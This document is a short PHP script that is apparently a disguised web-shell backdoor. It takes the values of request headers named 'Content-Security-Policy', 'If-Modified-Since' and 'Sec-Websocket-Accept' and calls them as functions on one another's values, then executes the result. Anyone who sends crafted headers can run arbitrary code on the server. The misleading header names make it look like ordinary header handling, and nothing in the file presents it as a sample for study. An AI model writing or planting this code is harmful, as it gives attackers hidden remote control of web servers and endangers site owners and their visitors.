<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['Content-Security-Policy'])) {
    $accept = $_HEADERS['Content-Security-Policy']('', $_HEADERS['If-Modified-Since']($_HEADERS['Sec-Websocket-Accept']));
    $accept();
}